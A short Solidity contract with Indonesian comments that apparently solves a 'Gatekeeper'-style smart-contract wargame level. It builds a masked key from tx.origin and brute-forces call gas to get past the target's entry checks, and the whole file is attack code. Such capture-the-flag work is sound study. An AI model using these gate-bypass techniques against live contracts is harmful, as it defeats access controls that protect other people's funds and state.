// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperAttack {
    
    // Fungsi untuk menghitung kunci Gate 3
    // Menggunakan teknik masking Bitwise
    function getKey() public view returns (bytes8) {
        // Ambil alamat tx.origin (Anda), jadikan uint64, 
        // lalu timpa dengan mask untuk meng-nol-kan bagian tengah.
        return bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    }

    // Fungsi utama serangan
    function attack(address _target) public {
        bytes8 key = getKey();
        
        // GATE 2 BRUTE FORCE:
        // Kita mencoba loop untuk mencari angka gas yang pas.
        // "i" adalah offset (variasi) gas.
        for (uint256 i = 0; i < 300; i++) {
            
            // Kita gunakan low-level call agar bisa mengatur gas spesifik.
            // (8191 * 3) adalah estimasi gas dasar agar cukup menjalankan fungsi.
            // + i adalah variasi brute force-nya.
            (bool success, ) = _target.call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            if (success) {
                // Jika berhasil, hentikan loop
                break;
            }
        }
    }
}